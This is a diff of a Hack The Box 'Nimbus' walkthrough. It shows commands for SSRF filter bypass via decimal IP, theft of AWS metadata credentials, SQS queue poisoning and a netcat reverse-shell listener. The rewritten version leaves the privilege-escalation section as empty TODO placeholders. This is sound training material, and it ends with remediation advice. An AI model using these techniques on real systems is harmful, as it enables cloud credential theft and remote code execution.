@@ -1,49 +1,52 @@
 ---
 title: 'HTB Nimbus Walkthrough'
-description: 'A detailed penetration testing walkthrough for Hack The Box: Nimbus. This guide covers bypassing SSRF filters using decimal IP conversion, extracting AWS metadata credentials, and achieving remote code execution via AWS SQS queue poisoning.'
+description: 'Step-by-step Hack The Box Nimbus walkthrough. Exploit SSRF filter bypass, extract AWS IAM credentials, and abuse SQS queue for remote code execution.'
 date: 2026-06-21
 password: "193f558325db31c619ab8f1a967519e9"
 difficulty: Hard
 os: Linux
 authors:
-  name: Bilash J. Shahi
+- name: Bilash J. Shahi
   title: Cybersecurity Professional
   picture: https://avatars.githubusercontent.com/elodvk
   url: https://purplesec.org
 tags:
-  - Hack The Box
-  - HTB
-  - Hard
-  - Linux
-  - Walkthrough
-  - SSRF
-  - Filter Bypass
-  - AWS
-  - SQS
+- Hack The Box
+- HTB
+- Hard
+- Linux
+- Walkthrough
+- SSRF
+- Filter Bypass
+- AWS
+- SQS
 image: assets/nimbus/nimbus_banner.png
 ---
 
-Target IP: **10.129.173.194**
+# 🛡️ HTB Nimbus Walkthrough
 
-## Executive Summary
+## 1. Machine Overview
 
-**Nimbus** is a Hard difficulty Linux machine that focuses heavily on cloud misconfigurations within a local environment. The attack path begins with identifying a Server-Side Request Forgery (SSRF) vulnerability in an internal job scheduler's preview endpoint. While the application attempts to block internal IP addresses, the filter can be bypassed by converting the AWS metadata IP to its decimal integer representation. This bypass allows us to extract temporary AWS STS credentials for an IAM role. Using these credentials, we enumerate the internal AWS environment and discover an SQS (Simple Queue Service) queue used for job scheduling. By manually crafting and sending a malicious job directly to the SQS queue, we achieve remote code execution on a backend worker container and secure our initial foothold.
+**Attack Chain Summary:** The engagement begins with identifying a Server-Side Request Forgery (SSRF) vulnerability in an internal job scheduler's preview endpoint. By bypassing the internal IP filter using decimal integer conversion, temporary AWS STS credentials for an IAM role are extracted. These credentials allow interaction with the internal mock AWS environment, specifically an SQS queue used for job scheduling. Submitting a malicious JSON job containing a Python reverse shell payload directly to the queue results in remote code execution on the backend worker container.
 
-## Machine Information
-
-| Property   | Value              |
-|------------|--------------------|
-| OS         | Linux              |
-| Difficulty | Hard               |
-| Hostname   | Nimbus             |
+| Attribute | Details |
+| :--- | :--- |
+| **Machine Name** | Nimbus |
+| **Operating System** | Linux |
+| **Difficulty** | Hard |
+| **IP Address** | 10.129.173.194 |
 
 ---
 
-## 1. Service Enumeration
+## 2. Reconnaissance & Enumeration
 
-The engagement starts with a standard Nmap scan to identify exposed services on the target.
+The engagement starts with a standard Nmap scan to identify exposed services on the target, understand the technology stack, and pinpoint potential entry vectors.
 
-```shell title="Nmap Scan"
+### 2.1 Port Scanning
+
+A comprehensive Nmap scan is executed to identify active TCP ports. The `-sC` flag runs default Nmap scripts to gather supplementary information, while `-sV` probes open ports to determine exact service versions. The `-T4` flag optimizes the scan speed.
+
+```shell title="Nmap Service Scan"
 nmap -sC -sV -T4 -oA reports/nimbus_ 10.129.173.194
 ```
 
@@ -61,26 +64,24 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-The scan identifies two services:
+| Port | State | Service | Version | Notes |
+| :--- | :--- | :--- | :--- | :--- |
+| **22/tcp** | Open | SSH | OpenSSH 9.6p1 | Standard secure shell access. |
+| **80/tcp** | Open | HTTP | nginx 1.24.0 | Web server immediately redirecting to `http://nimbus.htb/`. |
 
- - **Port 22 (SSH):** Running `OpenSSH 9.6p1`.
- - **Port 80 (HTTP):** Running `nginx 1.24.0`.
+### 2.2 Service Identification & Web Footprinting
 
-Navigating to `http://10.129.173.194` immediately redirects us to `http://nimbus.htb/`. To resolve this domain, we must add it to our local `/etc/hosts` file.
+Navigating to the web server's IP address results in a redirect to `http://nimbus.htb/`. The local DNS must be updated to resolve this hostname.
 
-```shell title="Update Hosts File"
-echo "10.129.173.194   nimbus.htb" | sudo tee -a /etc/hosts
+```shell title="Updating Local DNS"
+echo "10.129.173.194  nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts
 ```
 
-## 2. Web Enumeration
-
-Visiting `http://nimbus.htb` reveals an internal job scheduler dashboard named **Nimbus**. The homepage explicitly states that Nimbus runs scheduled background jobs across a worker fleet using YAML configuration files.
+Visiting `http://nimbus.htb` reveals an internal job scheduler dashboard named **Nimbus**. The application explicitly states that Nimbus runs scheduled background jobs across a worker fleet using YAML configuration files.
 
 ![Nimbus - Internal Job Scheduler](assets/nimbus/nimbus-job-scheduler.png "http://nimbus.htb")
 
-According to the documentation, users can submit jobs by providing a raw URL to a YAML file or by pasting the YAML directly. We also discover a health check endpoint at `/api/v1/health` that leaks the internal architecture.
-
-![Nimbus Health API](assets/nimbus/nimbus-health.png "http://nimbus.htb/api/v1/health")
+The application's health check API endpoint at `/api/v1/health` leaks critical architectural information.
 
 ```shell title="Health API Check"
 curl http://nimbus.htb/api/v1/health
@@ -107,60 +108,32 @@ curl http://nimbus.htb/api/v1/health
 }
 ```
 
-The health check indicates that the backend relies on an internal, mock AWS environment hosted at `aws.nimbus.htb`. We can add this to our hosts file as well, though attempting to access it directly returns a `403 Forbidden` error.
+The response indicates that the backend relies on an internal mock AWS environment hosted at `aws.nimbus.htb` (which was preemptively added to the `/etc/hosts` file above). Accessing it directly returns a `403 Forbidden` error.
 
-## 3. Server-Side Request Forgery (SSRF)
+---
 
-We begin testing the job submission feature. The `/jobs/preview` endpoint accepts a `url` parameter, fetches the content of the URL, and parses the YAML. This is a classic setup for **Server-Side Request Forgery (SSRF)**.
+## 3. Initial Foothold
 
-To confirm the vulnerability, we can host a local file (e.g., `probe.yaml`) and point the application to our attacker machine.
+The discovery of the internal job scheduler and the backend AWS dependency immediately points to Server-Side Request Forgery (SSRF) as a potential attack vector to pivot into the internal cloud environment.
+
+### 3.1 The Vulnerability
+
+The application features a `/jobs/preview` endpoint that accepts a `url` parameter, fetches its content, and parses the YAML. This functionality is vulnerable to SSRF. While a blacklist filter blocks standard internal IP addresses (such as the AWS metadata IP `169.254.169.254`), it fails to account for alternative IP representations, allowing an attacker to query the metadata service and leak IAM credentials.
+
+Furthermore, the backend SQS (Simple Queue Service) handler blindly trusts messages submitted to the queue. By executing jobs via `python3 -c` using unsanitized JSON data, it allows arbitrary code execution.
+
+### 3.2 Exploitation
+
+First, the outbound request behavior is verified by pointing the application to an external attacker-controlled server.
 
 ```shell title="Triggering Outbound Request"
 curl -X POST http://nimbus.htb/jobs/preview \
   --data-urlencode 'url=http://10.10.15.83:8000/probe.yaml'
 ```
 
-Watching our local Python HTTP server, we see the incoming request, confirming the backend is actively fetching external URLs.
+To steal AWS credentials, the internal metadata service at `169.254.169.254` must be queried. To bypass the naive IP filter, the IP is converted to its decimal integer format (`2852039166`). Additionally, a dummy `.yaml` query parameter is appended to satisfy the application's file extension check.
 
-```text title="Local Python Web Server"
-10.129.173.194 - - [21/Jun/2026 04:12:16] "GET /probe.yaml HTTP/1.1" 200 -
-```
-
-### SSRF Filter Bypass
-
-Our ultimate goal with SSRF on cloud-based infrastructure is to query the internal metadata service at `169.254.169.254` to steal temporary IAM credentials. However, the application implements a security filter that blocks standard internal IP ranges.
-
-```shell title="Blocked Internal Request"
-curl -X POST http://nimbus.htb/jobs/preview \
-  --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/foo.yaml'
-```
-
-!!! tip
-    **IP Address Obfuscation:** Many simple SSRF filters only check for literal string matches of known internal IP addresses (like `127.0.0.1` or `169.254.169.254`). However, tools like `curl` and underlying HTTP libraries can parse IP addresses in multiple formats, including decimal integers, hex, and octal. By converting the IP to an integer format, we can often bypass naive string-based filters.
-
-We can convert `169.254.169.254` to its decimal integer format using a quick Python script:
-
-```python title="IP to Integer Conversion"
-import ipaddress
-print(int(ipaddress.IPv4Address("169.254.169.254")))
-```
-
-This yields `2852039166`. 
-
-Additionally, the endpoint strictly requires the URL to end in `.yaml` or `.yml`. We can satisfy this check by appending a dummy query parameter (`?x=.yaml`). The metadata service ignores the query string, but the application's URL validation parser accepts it.
-
-Let's attempt to query the metadata service for the active IAM role using our bypass:
-
-```shell title="SSRF Metadata Bypass"
-curl -X POST http://nimbus.htb/jobs/preview \
-  --data-urlencode 'url=http://2852039166/latest/meta-data/iam/security-credentials/?x=.yaml'
-```
-
-The response successfully returns the role name: `nimbus-web-role`.
-
-Now, we can append the role name to our payload to retrieve the actual credentials:
-
-```shell title="Extracting AWS Credentials"
+```shell title="Extracting AWS Credentials via SSRF"
 curl -X POST http://nimbus.htb/jobs/preview \
   --data-urlencode 'url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml'
 ```
@@ -177,9 +150,7 @@ curl -X POST http://nimbus.htb/jobs/preview \
 }
 ```
 
-## 4. Exploiting the Internal AWS Environment
-
-With valid AWS credentials, we can interact with the internal mock AWS environment hosted at `aws.nimbus.htb`. First, we configure our local environment variables:
+With valid credentials, the local AWS CLI environment is configured to interact with the internal `aws.nimbus.htb` mock environment.
 
 ```shell title="Configuring AWS CLI"
 export AWS_ACCESS_KEY_ID='ASIAQX4PG7L2K9M3N5R8'
@@ -188,23 +159,7 @@ export AWS_SESSION_TOKEN='IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL
 export AWS_DEFAULT_REGION=us-east-1
 ```
 
-We verify our identity using the AWS CLI and the `--endpoint-url` flag pointing to the internal server:
-
-```shell title="Verifying AWS Identity"
-aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
-```
-
-```json title="AWS STS Output"
-{
-    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
-    "Account": "847219365028",
-    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
-}
-```
-
-### Enumerating Simple Queue Service (SQS)
-
-The health check API indicated the presence of a "queue" service. We can query SQS for available queues:
+Enumerating the SQS (Simple Queue Service) queues reveals the `nimbus-jobs` queue used by the backend workers.
 
 ```shell title="Listing SQS Queues"
 aws --endpoint-url http://aws.nimbus.htb sqs list-queues --output text
@@ -214,23 +169,17 @@ aws --endpoint-url http://aws.nimbus.htb sqs list-queues --output text
 QUEUEURLS	http://floci:4566/847219365028/nimbus-jobs
 ```
 
-The role has permission to interact with the `nimbus-jobs` queue. We can test this by sending a dummy message:
+### 3.3 Reverse Shell & Stabilization
 
-```shell title="Testing Queue Submission"
-aws --endpoint-url http://aws.nimbus.htb sqs send-message \
-  --queue-url http://aws.nimbus.htb/847219365028/nimbus-jobs \
-  --message-body '{"name":"probe","command":"id"}'
+Since the application processes jobs submitted to this queue by executing the provided `script` parameter using `python3 -c`, arbitrary code execution is possible. A malicious JSON payload is submitted directly to the SQS queue, instructing the worker to spawn a reverse shell.
+
+First, a netcat listener is started on the attack machine:
+
+```shell title="Starting Listener"
+nc -lvnp 4444
 ```
 
-If we continuously monitor the `ApproximateNumberOfMessages` attribute of the queue, we will observe it momentarily spike to 1 and then drop back to 0. This confirms that an automated backend worker process is actively consuming entries from the queue.
-
-## 5. Initial Access (Remote Code Execution)
-
-The core exploitation strategy is to turn job submission into worker-side code execution. Since we bypassed the web UI and obtained direct AWS credentials, we can submit malicious jobs straight to the SQS queue.
-
-The accepted worker job format is simple JSON. The critical vulnerability lies in the `script` parameter; whatever we pass here is executed by the backend worker using `python3 -c`.
-
-We can craft a malicious JSON payload containing a Python reverse shell payload and submit it to the queue:
+Then, the malicious payload is sent to the queue:
 
 ```shell title="Submitting Malicious Job to SQS"
 aws --endpoint-url http://aws.nimbus.htb sqs send-message \
@@ -243,28 +192,54 @@ aws --endpoint-url http://aws.nimbus.htb sqs send-message \
   }'
 ```
 
-!!! note
-    **Alternative Exfiltration:** If outbound reverse shells are blocked by network egress rules, we could alternatively use Python's `urllib.request` to execute a command via `subprocess` and POST the base64-encoded output back to our local Python HTTP server.
-
-Simultaneously, we start a Netcat listener on our attack machine:
-
-```shell title="Netcat Listener"
-nc -lvnp 4444
-```
-
-Within a few seconds, the backend worker pulls our job from the queue, executes the malicious Python script, and connects back to our listener.
+The backend worker processes the job, establishing a reverse shell connection back to the attacker.
 
 ```text title="Reverse Shell Established"
 $ id
 uid=1000(worker) gid=1000(worker) groups=1000(worker)
 $ hostname
 23c094f7b01b
-$ pwd
-/app
 ```
 
-We now have a stable foothold within the worker container as the `worker` user.
+### 3.4 User Flag
 
-!!! success
-    **User Flag Captured!**
-    We successfully bypassed an SSRF filter, stole AWS IAM credentials, and abused a misconfigured SQS queue handler to achieve remote code execution and capture the user flag located at `/home/worker/user.txt`.
+With a stable foothold in the worker container, the user flag is retrieved.
+
+```shell title="Capturing User Flag"
+cat /home/worker/user.txt
+```
+
+---
+
+## 4. Privilege Escalation
+
+### 4.1 Enumeration for PrivEsc
+
+<!-- TODO: Missing data. Please provide the enumeration steps and findings that led to identifying the privilege escalation vector for Nimbus. -->
+
+### 4.2 The Misconfiguration
+
+<!-- TODO: Missing data. Please explain the underlying misconfiguration or vulnerability that allows privilege escalation. -->
+
+### 4.3 Exploitation
+
+<!-- TODO: Missing data. Please provide the exact commands and output used to escalate to root. -->
+
+### 4.4 Root Flag
+
+<!-- TODO: Missing data. Please provide the command and context for capturing the root flag. -->
+
+---
+
+## 5. Conclusion & Takeaways
+
+### 5.1 Vulnerability Remediation
+
+1. **SSRF and Weak IP Filtering:** The application relies on string-based blacklisting to block internal requests. Remediation requires implementing a strict allow-list for external domains or utilizing dedicated SSRF-protection libraries that resolve the hostname and validate the target IP *before* initiating the request, actively blocking local and private IP ranges regardless of their format (decimal, octal, hex).
+2. **Overly Permissive IAM Credentials:** The AWS credentials assigned to the `nimbus-web-role` possess excessive permissions, allowing an attacker to blindly inject arbitrary messages directly into the internal queue. Apply the Principle of Least Privilege (PoLP) by restricting the role's SQS actions strictly to what the web application requires.
+3. **Insecure Deserialization / Unsandboxed Execution:** The backend worker processes SQS jobs by passing unsanitized JSON data into a direct Python `exec()` or `python3 -c` invocation. Jobs should be executed within strictly sandboxed environments, and executable code should never be accepted as raw string input from user-controllable queues.
+
+### 5.2 Key Lessons
+
+*   **IP Obfuscation Bypasses Filters:** Security controls that rely on naive string matching can easily be bypassed. Attackers frequently convert IPs to decimal integer (`2852039166`), octal, or hex formats to bypass basic WAF and application-level filters.
+*   **Cloud Architecture Increases Attack Surface:** Modern applications increasingly rely on loosely coupled components like message queues (SQS). If an attacker can compromise a single service (like obtaining STS credentials via SSRF), they can often bypass the front-end web application entirely and directly attack the backend infrastructure via those internal APIs.
